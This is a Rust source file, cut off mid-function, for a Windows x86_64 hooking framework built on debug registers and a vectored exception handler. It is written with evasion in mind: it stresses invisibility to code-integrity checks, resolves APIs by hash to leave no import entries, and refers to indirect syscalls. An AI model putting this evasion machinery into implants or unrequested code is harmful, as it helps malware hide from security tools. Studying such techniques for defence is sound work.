//! Hardware-breakpoint hooking framework using x86_64 debug registers (Dr0–Dr3).
//!
//! # Overview
//!
//! This module provides a general-purpose hooking mechanism based on CPU debug
//! registers instead of inline byte patching.  Unlike `INT3` (0xCC) or `JMP`
//! (0xEB/0xE9) hooks, hardware breakpoints are **completely invisible** to
//! code-integrity checks: no bytes in the target function's `.text` section
//! are modified.
//!
//! # Architecture
//!
//! The x86_64 architecture provides four debug address registers (Dr0–Dr3) and
//! a debug control register (Dr7).  Each slot can be programmed to trap on
//! execute, write, or read/write at a linear address.  The trap manifests as
//! `STATUS_SINGLE_STEP` (0x80000004), delivered to any registered VEH handler
//! before any other exception handler.
//!
//! This module:
//!
//! 1. Manages a registry mapping target addresses → callbacks.
//! 2. Installs a VEH handler that intercepts `STATUS_SINGLE_STEP` exceptions.
//! 3. Programs debug registers via `NtGetContextThread` / `NtSetContextThread`
//!    (resolved from ntdll by hash — no IAT entries).
//! 4. Supports thread-local or process-wide hook installation.
//!
//! # Constraints
//!
//! - Maximum 4 simultaneous breakpoints (architectural limit).
//! - Must not interfere with debugger hardware breakpoints.
//! - Windows x86_64 only.
//! - All thread manipulation uses `clean_call!` or indirect syscalls.
//!
//! # Safety
//!
//! All exported functions are `unsafe`.  They manipulate thread contexts and
//! install VEH handlers.  Must only be called on Windows x86_64.

#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
use common::lock::MutexExt;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
use std::sync::Mutex;

// ── Constants ─────────────────────────────────────────────────────────────────

/// Maximum number of hardware breakpoint slots (Dr0–Dr3).
pub const MAX_HW_BP_SLOTS: usize = 4;

/// `STATUS_SINGLE_STEP` exception code — fired when a hardware breakpoint hits.
const STATUS_SINGLE_STEP: u32 = 0x80000004;

/// VEH return: continue execution (exception handled).
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;

/// VEH return: pass to next handler.
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Dr7 bit layout for an execute breakpoint in a given slot.
///
/// | Bits  | Field                     |
/// |-------|---------------------------|
/// | 2i    | Local Enable (LEi)        |
/// | 2i+1  | Global Enable (GEi)       |
/// | 16+4i | Condition (R/Wi), 00 = X  |
/// | 16+4i+2| Length (Leni), 00 = 1B   |
///
/// For an execute breakpoint (R/Wi=0, Leni=0), only the LE bit needs setting.
#[inline]
const fn dr7_local_enable_bit(slot: usize) -> u64 {
    1u64 << (slot * 2)
}

/// `CONTEXT_DEBUG_REGISTERS` flag for Get/SetThreadContext.
const CONTEXT_DEBUG_REGISTERS: u32 = 0x00100010;

/// Thread access rights for debug-register programming:
/// `THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION`.
const THREAD_CTX_ACCESS: u64 = 0x1A02;

// ── Types ─────────────────────────────────────────────────────────────────────

/// Breakpoint type — controls what access triggers the exception.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
#[repr(u8)]
pub enum BpType {
    /// Break on instruction execution at the target address.
    Execute = 0,
    /// Break on write to the target address.
    Write = 1,
    /// Break on read or write to the target address.
    ReadWrite = 3,
}

/// Breakpoint size — the size of the watched region.
///
/// For `BpType::Execute`, this must be `Byte1`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
#[repr(u8)]
pub enum BpSize {
    /// 1-byte watch region.
    Byte1 = 0,
    /// 2-byte watch region.
    Byte2 = 1,
    /// 4-byte watch region.
    Byte4 = 2,
    /// 8-byte watch region (only valid for Write/ReadWrite).
    Byte8 = 3,
}

/// A single hardware breakpoint configuration.
#[derive(Clone, Copy, Debug)]
pub struct HardwareBreakpoint {
    /// Linear address to trap on.
    pub address: usize,
    /// Type of access that triggers the breakpoint.
    pub bp_type: BpType,
    /// Size of the watched region.
    pub size: BpSize,
    /// Debug register slot (0–3).
    pub slot: u8,
}

/// Callback invoked when a hardware breakpoint fires.
///
/// The callback receives a mutable pointer to the thread's `CONTEXT` and
/// returns `true` if the exception was handled (skip the instruction) or
/// `false` to propagate the exception to the next handler.
///
/// # Safety
///
/// The callback is called inside a VEH handler.  It must not:
/// - Call any API that acquires the loader lock (LoadLibrary, GetProcAddress, etc.).
/// - Call any API that acquires the heap lock (malloc, free, etc.).
/// - Perform blocking operations.
/// - Cause recursive exceptions.
pub type HwBpCallback = unsafe fn(*mut u64) -> bool;

// ── Internal state ─────────────────────────────────────────────────────────────

/// Per-slot hook entry.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
struct HookEntry {
    /// Target address that is breakpointed.
    target_addr: usize,
    /// Callback to invoke when the breakpoint fires.
    callback: HwBpCallback,
    /// The size of the instruction at `target_addr` (in bytes).
    /// Used to advance RIP past the breakpoint when the callback returns `true`.
    /// 0 means "callback handles RIP itself".
    instruction_size: u8,
}

/// Global hook manager state.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
struct HwBpState {
    /// Per-slot hook entries.  `None` = slot is free.
    slots: [Option<HookEntry>; MAX_HW_BP_SLOTS],
    /// VEH handle returned by `AddVectoredExceptionHandler`.
    veh_handle: usize,
}

#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
static STATE: Mutex<Option<HwBpState>> = Mutex::new(None);

/// Whether the VEH handler has been registered.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
static VEH_REGISTERED: AtomicBool = AtomicBool::new(false);

/// Quick-lookup address table for the VEH handler.
/// Each slot stores the target address (0 = unused).
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
static SLOT_ADDRESSES: [AtomicUsize; MAX_HW_BP_SLOTS] = [
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
];

/// Quick-lookup callback table for the VEH handler.
/// Each slot stores the callback function pointer (0 = unused).
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
static SLOT_CALLBACKS: [AtomicUsize; MAX_HW_BP_SLOTS] = [
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
];

/// Quick-lookup instruction-size table for the VEH handler.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
static SLOT_INSN_SIZES: [AtomicUsize; MAX_HW_BP_SLOTS] = [
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
];

// ── Windows type definitions ──────────────────────────────────────────────────
//
// Local definitions to avoid importing winapi types in the VEH handler path.
// The CONTEXT structure layout must match the Windows x86_64 ABI exactly.

/// Minimal `EXCEPTION_POINTERS` for VEH handler use.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
#[repr(C)]
struct ExceptionPointers {
    exception_record: *mut ExceptionRecord,
    context_record: *mut ContextRegs,
}

/// Minimal `EXCEPTION_RECORD` — only the fields we need.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
#[repr(C)]
struct ExceptionRecord {
    exception_code: u32,
    exception_flags: u32,
    exception_record: *mut ExceptionRecord,
    exception_address: u64,
    number_parameters: u32,
    _exception_information: [u64; 15], // EXCEPTION_MAXIMUM_PARAMETERS
}

/// Minimal CONTEXT — only the register fields needed for debug register
/// manipulation and RIP redirection.  Offset-accurate to the real structure.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
#[repr(C)]
struct ContextRegs {
    _p1_home: u64,
    _p2_home: u64,
    _p3_home: u64,
    _p4_home: u64,
    _p5_home: u64,
    _p6_home: u64,
    _context_flags: u32,
    _mxcsr: u32,
    _seg_cs: u16,
    _seg_ds: u16,
    _seg_es: u16,
    _seg_fs: u16,
    _seg_gs: u16,
    _seg_ss: u16,
    _e_flags: u32,
    dr0: u64,
    dr1: u64,
    dr2: u64,
    dr3: u64,
    _dr6: u64,
    dr7: u64,
    rax: u64,
    rcx: u64,
    rdx: u64,
    rbx: u64,
    rsp: u64,
    rbp: u64,
    rsi: u64,
    rdi: u64,
    r8: u64,
    r9: u64,
    r10: u64,
    r11: u64,
    r12: u64,
    r13: u64,
    r14: u64,
    r15: u64,
    rip: u64,
}

// ── VEH Handler ──────────────────────────────────────────────────────────────

/// VEH handler for hardware breakpoint exceptions.
///
/// This function is registered via `AddVectoredExceptionHandler` and is called
/// for every exception in the process.  It:
///
/// 1. Checks if the exception code is `STATUS_SINGLE_STEP`.
/// 2. Reads the faulting RIP from the exception context.
/// 3. Looks up the RIP in the per-slot address table (lock-free).
/// 4. If found, invokes the registered callback and advances RIP.
/// 5. Returns `EXCEPTION_CONTINUE_EXECUTION` or `EXCEPTION_CONTINUE_SEARCH`.
///
/// # Lock-free design
///
/// The VEH handler uses only `AtomicUsize` loads — no locks, no heap access.
/// This is critical because VEH handlers run in a restricted context where
/// acquiring locks can deadlock.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe extern "system" fn veh_handler(exception_info: *mut ExceptionPointers) -> i32 {
    let record = (*exception_info).exception_record;
    let context = (*exception_info).context_record;

    // Only handle STATUS_SINGLE_STEP.
    if (*record).exception_code != STATUS_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let rip = (*context).rip as usize;

    // Lock-free slot lookup.
    for slot in 0..MAX_HW_BP_SLOTS {
        let addr = SLOT_ADDRESSES[slot].load(Ordering::Relaxed);
        if addr != 0 && addr == rip {
            let callback_ptr = SLOT_CALLBACKS[slot].load(Ordering::Relaxed);
            if callback_ptr == 0 {
                continue;
            }
            let callback: HwBpCallback = std::mem::transmute(callback_ptr);

            // Invoke the callback with a pointer to the context's register area.
            // The callback can modify registers directly (e.g. change RAX, redirect RIP).
            let handled = callback(&mut (*context).rax as *mut u64);

            if handled {
                // If the callback didn't modify RIP, advance past the breakpointed
                // instruction using the recorded instruction size.
                let insn_size = SLOT_INSN_SIZES[slot].load(Ordering::Relaxed);
                if insn_size != 0 && (*context).rip as usize == rip {
                    (*context).rip = (rip + insn_size) as u64;
                }
                // Clear the RF (Resume Flag) bit in EFlags to prevent
                // re-triggering the breakpoint on the next instruction.
                (*context)._e_flags &= !(1 << 16);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            // Callback declined to handle — propagate.
            return EXCEPTION_CONTINUE_SEARCH;
        }
    }

    // Not one of our breakpoints.  Could be a genuine single-step from
    // TF flag or a debugger's hardware breakpoint.  Pass it along.
    EXCEPTION_CONTINUE_SEARCH
}

// ── Internal helpers ──────────────────────────────────────────────────────────

/// Resolve `AddVectoredExceptionHandler` from kernel32 by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_add_veh() -> Option<unsafe extern "system" fn(u32, *mut std::ffi::c_void) -> *mut std::ffi::c_void> {
    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
    let hash = pe_resolve::hash_str(b"AddVectoredExceptionHandler\0");
    let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `RemoveVectoredExceptionHandler` from kernel32 by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_remove_veh() -> Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32> {
    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
    let hash = pe_resolve::hash_str(b"RemoveVectoredExceptionHandler\0");
    let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtGetContextThread` from ntdll by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_nt_get_context() -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtGetContextThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtSetContextThread` from ntdll by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_nt_set_context() -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtSetContextThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtOpenThread` from ntdll by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_nt_open_thread() -> Option<unsafe extern "system" fn(*mut usize, u64, *mut u64, *mut u64) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtOpenThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtSuspendThread` / `NtResumeThread` from ntdll by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_nt_suspend_thread() -> Option<unsafe extern "system" fn(usize, *mut u32) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtSuspendThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_nt_resume_thread() -> Option<unsafe extern "system" fn(usize, *mut u32) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtResumeThread\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `NtClose` from ntdll by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_nt_close() -> Option<unsafe extern "system" fn(usize) -> i32> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let hash = pe_resolve::hash_str(b"NtClose\0");
    let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
    Some(std::mem::transmute(addr))
}

/// Resolve `GetCurrentThreadId` from kernel32 by hash.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn resolve_get_current_thread_id() -> Option<unsafe extern "system" fn() -> u32> {
    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
    let hash = pe_resolve::hash_str(b"GetCurrentThreadId\0");
    let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
    Some(std::mem::transmute(addr))
}

/// Ensure the VEH handler is registered.  Called lazily before the first hook
/// installation.  Returns `true` if the handler is active (or was already).
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn ensure_veh() -> bool {
    if VEH_REGISTERED.load(Ordering::Acquire) {
        return true;
    }

    let add_veh = match resolve_add_veh() {
        Some(f) => f,
        None => {
            tracing::error!("hw_bp_hook: failed to resolve AddVectoredExceptionHandler");
            return false;
        }
    };

    // Register with high priority (first=1) so we see exceptions before
    // any other VEH handler.
    let handle = add_veh(
        1,
        veh_handler as *mut std::ffi::c_void,
    );

    if handle.is_null() {
        tracing::error!("hw_bp_hook: AddVectoredExceptionHandler returned NULL");
        return false;
    }

    VEH_REGISTERED.store(true, Ordering::Release);

    // Store the VEH handle in the state for later removal.
    {
        let mut state = STATE.lock_recover();
        match &mut *state {
            Some(s) => s.veh_handle = handle as usize,
            None => {
                *state = Some(HwBpState {
                    slots: [None, None, None, None],
                    veh_handle: handle as usize,
                });
            }
        }
    }

    tracing::debug!("hw_bp_hook: VEH handler registered at {:#x}", veh_handler as *const () as usize);
    true
}

/// Program the debug registers for a specific thread.
///
/// Sets Dr0–Dr3 and Dr7 to match the currently active hooks in the state.
/// The thread must be suspended before calling this if it is not the current thread.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
unsafe fn program_debug_regs_for_thread(
    thread_handle: usize,
    nt_get_ctx: unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32,
    nt_set_ctx: unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32,
) -> bool {
    let mut ctx: crate::win_types::CONTEXT = std::mem::zeroed();
    ctx.context_flags = CONTEXT_DEBUG_REGISTERS;

    if nt_get_ctx(thread_handle, &mut ctx) < 0 {
        tracing::warn!("hw_bp_hook: NtGetContextThread failed");
        return false;
    }

    // Read the slot configuration from the atomic tables.
    // Only modify Dr0–Dr3 for slots we own (non-zero address).
    let mut dr7_mask: u64 = 0;

    for slot in 0..MAX_HW_BP_SLOTS {
        let addr = SLOT_ADDRESSES[slot].load(Ordering::Relaxed);
        match slot {
            0 => ctx.dr0 = addr as u64,
            1 => ctx.dr1 = addr as u64,
            2 => ctx.dr2 = addr as u64,
            3 => ctx.dr3 = addr as u64,
            _ => unreachable!(),
        }
        if addr != 0 {
            dr7_mask |= dr7_local_enable_bit(slot);
        }
    }

    // Preserve any existing global or local enable bits we don't own,
    // but clear the local enable bits for all slots first to avoid stale state.
    ctx.dr7 &= !0xF; // Clear L0-L3 (bits 0-3)
    ctx.dr7 |= dr7_mask;

    // For all active slots, ensure R/Wi=00 (execute) and Leni=00 (1 byte).
    // These are already 0 in dr7 after clearing, so no need to set them.
    // But clear the condition/length fields for our slots just in case:
    for slot in 0..MAX_HW_BP_SLOTS {
        if SLOT_ADDRESSES[slot].load(Ordering::Relaxed) != 0 {
            // Clear R/Wi and Leni fields for this slot.
            let rw_shift = 16 + slot * 4;
            let len_shift = 18 + slot * 4;
            ctx.dr7 &= !((0xFu64) << rw_shift);
            // _should_ be a no-op since we cleared all 4 bits, but be explicit.
            let _ = len_shift;
        }
    }

    if nt_set_ctx(thread_handle, &mut ctx) < 0 {
        tracing::warn!("hw_bp_hook: NtSetContextThread failed");
        return false;
    }

    true
}

/// Find a free debug register slot.  Returns `None` if all 4 are occupied.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
fn find_free_slot() -> Option<usize> {
    for slot in 0..MAX_HW_BP_SLOTS {
        if SLOT_ADDRESSES[slot].load(Ordering::Relaxed) == 0 {
            return Some(slot);
        }
    }
    None
}

/// Find the slot index for a given target address.  Returns `None` if not found.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
fn find_slot_by_addr(target_addr: usize) -> Option<usize> {
    for slot in 0..MAX_HW_BP_SLOTS {
        if SLOT_ADDRESSES[slot].load(Ordering::Relaxed) == target_addr {
            return Some(slot);
        }
    }
    None
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Check whether the hardware-breakpoint hooking framework is available.
///
/// Returns `true` if:
/// - Running on Windows x86_64.
/// - The VEH handler was successfully registered.
/// - At least one debug register slot is free.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub fn is_available() -> bool {
    if !VEH_REGISTERED.load(Ordering::Acquire) {
        // Try to register the VEH handler.
        if !unsafe { ensure_veh() } {
            return false;
        }
    }
    find_free_slot().is_some()
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub fn is_available() -> bool {
    false
}

/// Return the number of free debug register slots.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub fn free_slots() -> usize {
    let mut count = 0;
    for slot in 0..MAX_HW_BP_SLOTS {
        if SLOT_ADDRESSES[slot].load(Ordering::Relaxed) == 0 {
            count += 1;
        }
    }
    count
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub fn free_slots() -> usize {
    0
}

/// Install a hardware execute breakpoint on the target address.
///
/// # Arguments
///
/// * `target_addr` — Linear address to break on (must be the entry point of
///   the target function or instruction).
/// * `callback` — Function invoked when the breakpoint fires.  Receives a
///   pointer to the thread's register context (starting at RAX).  The callback
///   can modify registers and must return `true` if the exception was handled
///   (the framework will advance RIP by `instruction_size` bytes) or `false`
///   to propagate the exception.
/// * `instruction_size` — Size of the instruction at `target_addr` in bytes.
///   The framework advances RIP by this amount when the callback returns `true`.
///   Set to `0` if the callback handles RIP advancement itself.
///
/// # Returns
///
/// `Ok(HardwareBreakpoint)` on success, `Err` with a description on failure.
///
/// # Errors
///
/// - All 4 debug register slots are occupied.
/// - The VEH handler could not be registered.
/// - The target address is already breakpointed.
/// - Thread context manipulation failed.
///
/// # Safety
///
/// - Must be called on Windows x86_64.
/// - The target address must be in committed, executable memory.
/// - The callback must be safe to call from a VEH context (no heap, no locks,
///   no blocking).
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub unsafe fn install_hw_bp(
    target_addr: usize,
    callback: HwBpCallback,
    instruction_size: u8,
) -> Result<HardwareBreakpoint, &'static str> {
    // Ensure the VEH handler is registered.
    if !ensure_veh() {
        return Err("failed to register VEH handler");
    }

    // Check if this address is already hooked.
    if find_slot_by_addr(target_addr).is_some() {
        return Err("target address already has a hardware breakpoint");
    }

    // Find a free slot.
    let slot = match find_free_slot() {
        Some(s) => s,
        None => return Err("all 4 debug register slots are occupied"),
    };

    // Check if the slot's debug register is already in use by a debugger.
    // Read the current thread context to inspect Dr0–Dr3.
    let nt_get_ctx = match resolve_nt_get_context() {
        Some(f) => f,
        None => return Err("failed to resolve NtGetContextThread"),
    };
    let nt_set_ctx = match resolve_nt_set_context() {
        Some(f) => f,
        None => return Err("failed to resolve NtSetContextThread"),
    };

    let mut ctx: crate::win_types::CONTEXT = std::mem::zeroed();
    ctx.context_flags = CONTEXT_DEBUG_REGISTERS;

    // Use NtCurrentThread() pseudohandle (-2).
    let current_thread = -2isize as usize;
    if nt_get_ctx(current_thread, &mut ctx) < 0 {
        return Err("NtGetContextThread failed on current thread");
    }

    // Check the debug register for the chosen slot.
    let existing_addr = match slot {
        0 => ctx.dr0,
        1 => ctx.dr1,
        2 => ctx.dr2,
        3 => ctx.dr3,
        _ => unreachable!(),
    };
    if existing_addr != 0 {
        // A debugger or another subsystem is using this slot.
        return Err("debug register slot is already in use (debugger?)");
    }

    // Register the hook in the state.
    {
        let mut state = STATE.lock_recover();
        if let Some(s) = &mut *state {
            s.slots[slot] = Some(HookEntry {
                target_addr,
                callback,
                instruction_size,
            });
        } else {
            // Should not happen — ensure_veh() initializes state.
            return Err("internal state not initialized");
        }
    }

    // Update the lock-free lookup tables.
    SLOT_ADDRESSES[slot].store(target_addr, Ordering::Release);
    SLOT_CALLBACKS[slot].store(callback as usize, Ordering::Release);
    SLOT_INSN_SIZES[slot].store(instruction_size as usize, Ordering::Release);

    // Program the debug registers for the current thread.
    if !program_debug_regs_for_thread(current_thread, nt_get_ctx, nt_set_ctx) {
        // Roll back.
        SLOT_ADDRESSES[slot].store(0, Ordering::Release);
        SLOT_CALLBACKS[slot].store(0, Ordering::Release);
        SLOT_INSN_SIZES[slot].store(0, Ordering::Release);
        let mut state = STATE.lock_recover();
        if let Some(s) = &mut *state {
            s.slots[slot] = None;
        }
        return Err("failed to program debug registers for current thread");
    }

    tracing::debug!(
        "hw_bp_hook: installed execute breakpoint at {:#x} in Dr{} (insn_size={})",
        target_addr,
        slot,
        instruction_size,
    );

    Ok(HardwareBreakpoint {
        address: target_addr,
        bp_type: BpType::Execute,
        size: BpSize::Byte1,
        slot: slot as u8,
    })
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub unsafe fn install_hw_bp(
    _target_addr: usize,
    _callback: HwBpCallback,
    _instruction_size: u8,
) -> Result<HardwareBreakpoint, &'static str> {
    Err("hardware breakpoints not available on this platform")
}

/// Remove a hardware breakpoint by target address.
///
/// Clears the debug register slot and removes the callback from the registry.
/// Reprograms the debug registers for the current thread.
///
/// # Returns
///
/// `Ok(())` on success, `Err` with a description on failure.
///
/// # Safety
///
/// Must be called on Windows x86_64.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub unsafe fn remove_hw_bp(target_addr: usize) -> Result<(), &'static str> {
    let slot = match find_slot_by_addr(target_addr) {
        Some(s) => s,
        None => return Err("target address not found in hook registry"),
    };

    // Clear the lock-free tables first.
    SLOT_ADDRESSES[slot].store(0, Ordering::Release);
    SLOT_CALLBACKS[slot].store(0, Ordering::Release);
    SLOT_INSN_SIZES[slot].store(0, Ordering::Release);

    // Clear the state entry.
    {
        let mut state = STATE.lock_recover();
        if let Some(s) = &mut *state {
            s.slots[slot] = None;
        }
    }

    // Reprogram debug registers for the current thread.
    let nt_get_ctx = match resolve_nt_get_context() {
        Some(f) => f,
        None => return Err("failed to resolve NtGetContextThread"),
    };
    let nt_set_ctx = match resolve_nt_set_context() {
        Some(f) => f,
        None => return Err("failed to resolve NtSetContextThread"),
    };

    let current_thread = -2isize as usize;
    if !program_debug_regs_for_thread(current_thread, nt_get_ctx, nt_set_ctx) {
        tracing::warn!("hw_bp_hook: failed to reprogram debug regs after removal");
    }

    tracing::debug!(
        "hw_bp_hook: removed breakpoint from Dr{} (addr={:#x})",
        slot,
        target_addr,
    );

    Ok(())
}

#[cfg(not(all(windows, feature = "hw-bp-hook", target_arch = "x86_64")))]
pub unsafe fn remove_hw_bp(_target_addr: usize) -> Result<(), &'static str> {
    Err("hardware breakpoints not available on this platform")
}

/// Program debug registers for all threads in the current process.
///
/// This enumerates all threads via `CreateToolhelp32Snapshot`, suspends each
/// one, programs its debug registers, and resumes it.  The VEH handler is
/// process-wide (registered once), but debug registers are per-thread — each
/// thread must have its Dr0–Dr3 and Dr7 set individually.
///
/// # Safety
///
/// Suspends and resumes threads.  Must not be called from within a VEH handler
/// or any other restricted context.
#[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
pub unsafe fn install_for_all_threads() -> bool {
    let nt_get_ctx = match resolve_nt_get_context() {
        Some(f) => f,
        None => return false,
    };
    let nt_set_ctx = match resolve_nt_set_context() {
        Some(f) => f,
        None => return false,
    };
    let nt_open_thread = match resolve_nt_open_thread() {
        Some(f) => f,
        None => return false,
    };
    let nt_suspend = match resolve_nt_suspend_thread() {
        Some(f) => f,
        None => return false,
    };
    let nt_resume = match resolve_nt_resume_thread() {
        Some(f) => f,
        None => return false,
    };
    let nt_close = match resolve_nt_close() {
        Some(f) => f,
        None => return false,
    };

    // Check if any hooks are active.
    let any_active = (0..MAX_HW_BP_SLOTS).any(|s| SLOT_ADDRESSES[s].load(Ordering::Relaxed) != 0);
    if !any_active {
        tracing::debug!("hw_bp_hook: install_for_all_threads: no active hooks");
        return true;
    }

    // Resolve CreateToolhelp32Snapshot, Thread32First, Thread32Next.
    let k32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
        Some(b) => b,
        None => return false,
    };

    type CreateSnapshotFn = unsafe extern "system" fn(u32, u32) -> usize;
    type Thread32FirstFn = unsafe extern "system" fn(usize, *mut ThreadEntry32) -> i32;
    type Thread32NextFn = unsafe extern "system" fn(usize, *mut ThreadEntry32) -> i32;

    let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
    let first_hash = pe_resolve::hash_str(b"Thread32First\0");
    let next_hash = pe_resolve::hash_str(b"Thread32Next\0");

    let create_snap: CreateSnapshotFn = match pe_resolve::get_proc_address_by_hash(k32, snap_hash) {
        Some(a) => std::mem::transmute(a),
        None => return false,
    };
    let thread32_first: Thread32FirstFn = match pe_resolve::get_proc_address_by_hash(k32, first_hash) {
        Some(a) => std::mem::transmute(a),
        None => return false,
    };
    let thread32_next: Thread32NextFn = match pe_resolve::get_proc_address_by_hash(k32, next_hash) {
        Some(a) => std::mem::transmute(a),
        None => return false,
    };

    // TH32CS_SNAPTHREAD = 0x4
    let snapshot = create_snap(0x4, 0);
    if snapshot == usize::MAX || snapshot == 0 {
        tracing::warn!("hw_bp_hook: CreateToolhelp32Snapshot failed");
        return false;
    }

    // Get current PID to only target threads in our process.
    let get_pid: unsafe extern "system" fn() -> u32 = match pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"GetCurrentProcessId\0"),
    ) {
        Some(a) => std::mem::transmute(a),
        None => {
            let _ = crate::syscall!("NtClose", snapshot as u64);
            return false;
        }
    };
    let current_pid = get_pid();

    let mut entry = ThreadEntry32 {
        size: std::mem::size_of::<ThreadEntry32>() as u32,
        ..std::mem::zeroed()
    };

    if thread32_first(snapshot, &mut entry) == 0 {
        let _ = crate::syscall!("NtClose", snapshot as u64);
        return false;
    }

    let mut success = true;
    let mut thread_count = 0u32;

    loop {
        if entry.owner_process_id == current_pid {
            // Open the thread with the required access rights.
            let mut handle: usize = 0;
            let obj_attrs: u64 = 0; // NULL
            let mut client_id = [0u64; 2];
            client_id[1] = entry.thread_id as u64; // UniqueTid

            let status = nt_open_thread(&mut handle, THREAD_CTX_ACCESS, &obj_attrs as *const _ as *mut _, client_id.as_mut_ptr() as *mut _);

            if status >= 0 && handle != 0 {
                // Suspend the thread to safely modify its context.
                let mut suspend_count: u32 = 0;
                nt_suspend(handle, &mut suspend_count);

                // Program debug registers.
                if !program_debug_regs_for_thread(handle, nt_get_ctx, nt_set_ctx) {
